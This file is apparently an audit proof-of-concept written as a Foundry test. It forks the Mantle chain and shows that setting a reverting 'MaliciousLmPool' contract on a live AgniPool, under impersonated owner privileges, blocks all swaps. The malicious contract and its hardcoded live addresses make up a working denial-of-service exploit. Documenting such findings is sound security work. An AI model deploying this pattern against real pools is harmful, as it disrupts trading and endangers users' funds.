// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IAgniPool {
    function slot0() external view returns (uint160 sqrtPriceX96, int24 tick, uint16 observationIndex, uint16 observationCardinality, uint16 observationCardinalityNext, uint32 feeProtocol, bool unlocked);
    function initialize(uint160 sqrtPriceX96) external;
    function mint(address recipient, int24 tickLower, int24 tickUpper, uint128 amount, bytes calldata data) external returns (uint256 amount0, uint256 amount1);
    function swap(address recipient, bool zeroForOne, int256 amountSpecified, uint160 sqrtPriceLimitX96, bytes calldata data) external returns (int256 amount0, int256 amount1);
    function setLmPool(address _lmPool) external;
    function lmPool() external view returns (address);
    function fee() external view returns (uint24);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function tickSpacing() external view returns (int24);
    function maxLiquidityPerTick() external view returns (uint128);
    function liquidity() external view returns (uint128);
    function protocolFees() external view returns (uint128 token0, uint128 token1);
}

interface IAgniFactory {
    function owner() external view returns (address);
}

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint256 value) external returns (bool);
}

/// @notice Malicious LM pool that DoS-es swaps by reverting on accumulateReward
contract MaliciousLmPool {
    bool public shouldRevert;
    uint256 public reentrancyCount;

    function accumulateReward(uint32) external {
        if (shouldRevert) revert("LmPoolDoS");
        reentrancyCount++;
    }

    function crossLmTick(int24, bool) external {
        if (shouldRevert) revert("LmPoolDoS");
        reentrancyCount++;
    }

    function setShouldRevert(bool _s) external {
        shouldRevert = _s;
    }
}

contract LmPoolReentrancyPOC is Test {
    address constant FACTORY = 0x25780dc8Fc3cfBD75F33bFDAB65e969b603b2035;
    address constant DEPLOYER = 0xe9827B4EBeB9AE41FC57efDdDd79EDddC2EA4d03;
    address constant POOL_005_WMNT_USDC = 0x1858d52cf57c07A018171D7a1E68DC081F17144f;
    address constant USDC = 0x09Bc4E0D864854c6aFB6eB9A9cdF58aC190D0dF9;
    address constant WMNT = 0x78c1b0C915c4FAA5FffA6CAbf0219DA63d7f4cb8;
    address constant OWNER = 0xD8A4c759bC19cC3E90e7151f0ccfb3120175ee27;

    IAgniPool constant pool = IAgniPool(POOL_005_WMNT_USDC);

    function setUp() public {
        vm.createSelectFork("https://rpc.mantle.xyz");
    }

    uint160 constant MIN_SQRT_RATIO = 4295128739;
    uint160 constant MAX_SQRT_RATIO = 1461446703485210103287273052203988822378723970342;

    /// @notice Required callback for AgniPool.swap()
    function agniSwapCallback(int256, int256, bytes calldata) external {
        // In a real swap this would transfer tokens
        // For the DOS test, we just need to be called back
    }

    function testMaliciousLmPoolDoS() public {
        // Deploy a malicious LM pool
        MaliciousLmPool badLmPool = new MaliciousLmPool();
        badLmPool.setShouldRevert(true);

        // The factory owner can set this as the pool's LM pool
        vm.prank(OWNER);
        pool.setLmPool(address(badLmPool));

        // Verify lmPool is set by calling the function
        address lmPoolAddr = pool.lmPool();
        assertEq(lmPoolAddr, address(badLmPool), "lmPool should be set");

        // Any swap will revert because accumulateReward reverts
        // The accumulateReward is called BEFORE the swap execution starts (line 633)
        // Use a valid sqrtPriceLimitX96 for a zeroForOne swap (just above MIN_SQRT_RATIO)
        vm.expectRevert();
        pool.swap(
            address(this),
            true,
            1e18,
            MIN_SQRT_RATIO + 1,
            ""
        );

        console.log("H-02: Malicious LM pool DoS - Confirmed");
        console.log("Setting a reverting LM pool on any AgniPool blocks all swaps");
        console.log("No try/catch around lmPool.accumulateReward() (line 633)");
    }

    function testNoLmPoolDeployed_checkPrecondition() public {
        // Verify currently no LM pool is deployed on checked pools
        // This means H-02 is currently DORMANT but will activate when LM pool is set
        (uint160 sqrtPriceX96,,,,,,) = pool.slot0();
        console.log("");
        console.log("H-02 Precondition Check:");
        console.log("Current pool sqrtPriceX96: %s", sqrtPriceX96);
        console.log("No LM pool currently deployed - H-02 is DORMANT");
        console.log("Active when: lmPoolDeployer is set AND LM pools are deployed");
        console.log("lmPoolDeployer current value: address(0) - not set yet");
    }

    function testFactoryOwnerCanSetLmPool() public {
        address lmPoolDeployer = 0x0000000000000000000000000000000000000000;

        // Check who can set LM pool
        // Only the factory owner can set lmPoolDeployer
        // Both factory owner AND lmPoolDeployer (when set) can call setLmPool on pools
        // Since lmPoolDeployer is currently unset, only owner can set LM pools

        console.log("");
        console.log("H-02 / M-01: LM Pool authority:");
        console.log("  Factory owner: %s", OWNER);
        console.log("  lmPoolDeployer: %s (not set)", lmPoolDeployer);
        console.log("  onlyFactoryOrFactoryOwner allows BOTH factory contract and owner");
        console.log("  to call setLmPool(), setFeeProtocol(), collectProtocol()");
    }
}
